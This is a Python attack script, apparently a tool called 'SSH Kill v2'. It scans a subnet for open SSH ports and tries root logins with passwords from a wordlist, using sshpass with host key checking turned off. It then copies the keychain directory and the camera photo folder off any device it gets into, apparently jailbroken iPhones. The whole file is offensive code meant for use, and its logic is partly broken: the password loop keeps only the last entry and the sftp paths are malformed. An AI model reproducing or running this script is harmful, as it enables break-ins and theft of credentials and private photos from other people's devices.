import subprocess
import re
import socket
import os
import optparse
import time as mm
import sys as n
import re
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m' # gray
def slow(M):  ## By Twitter : @Matrix0700
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 100)


def slow2(M):  ## By Twitter : @Matrix0700
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
        mm.sleep(1. / 25)


def slow1(M):  ## By Twitter : @Matrix0700
    for c in M + '\n':
        n.stdout.write(c)
        n.stdout.flush()
try:
    os.system("apt install sshpass")
    os.system("clear")
except:
    pass
parser = optparse.OptionParser()
parser.add_option("-p", "--path",dest="path", help="were you want save ")
parser.add_option("-t", "--target",dest="target", help="target ip")
(options, arguments) = parser.parse_args()
logo1 = R+'''
    ._.                  _.____.
     ) \.              /    .(
     )  |            .'   .(
     ). ).          .'  .(
       ) |.        .'  (
       ). ;      ./  .(
        ) |      )  (
        ).;      :.(
         )|    .|.;
         .^--^./ (.
         ;0..0;   \ 
          'vv'_.:_.;     
               m  M 
'''
url = W+'https://github.com/xcodeon1  '
by = W+'Coded By :'
twitter =W+'Twitter :'
Code = G+'𝚇 𝙲 𝙾 𝙳 𝙴'
user = G+'@𝚇 𝙲 𝙾 𝙳 𝙴 𝙾 𝙽 𝙴 𝟷'
logo=W+'''
█▀ █▀ █░█   █▄▀ █ █░░ █░░   █░█ ▀█
▄█ ▄█ █▀█   █░█ █ █▄▄ █▄▄   ▀▄▀ █▄
'''
slow(C+f'''
{logo}                            
  {logo1}     
{by}  {Code}
{twitter} {user} 
{url}            
 ''' )

point = W+'.'*6
slow2(R+'Attack now\n'+W+'.'*65)
parser = optparse.OptionParser()
parser.add_option("-p", "--path",dest="path", help="path you save file in ")
(options, arguments) = parser.parse_args()
ip = str(input("Put you attack machine : "))
check_ip = str(subprocess.run(['nmap', '-p22','%s/24'% ip], stdout=subprocess.PIPE))
All_ip = re.findall(re.compile('\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}'), check_ip)
# ios= re.findall(re.compile('^open'),check_ip)
# print(check_ip)
for f in All_ip:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        host = f
        port = 22
        if s.connect_ex((host, port)):
            pass
        else:
            file = open("password.txt", "r")
            lines = file.readlines()
            # print(type(lines))
            # print(lines)
            for Password in lines:
                Passowrd = str(Password).strip()
            str(subprocess.run(
                ["sshpass", "-p", Password, "ssh", "-o StrictHostKeyChecking=no", f"root@{host}"]))
            os.system("clear")
            str(subprocess.run(["sshpass", "-p", Password, "sftp", "-r",
                                f"root@{host}:/var/Keychains %s" % options.path]))
            str(subprocess.run(
                ["sshpass", "-p", Password, "sftp", "-r",
                 f"root@{host}:/var/mobile/Media/DCIM/100APPLE/ %s" % options.path]))
            exit()
    except:
        pass

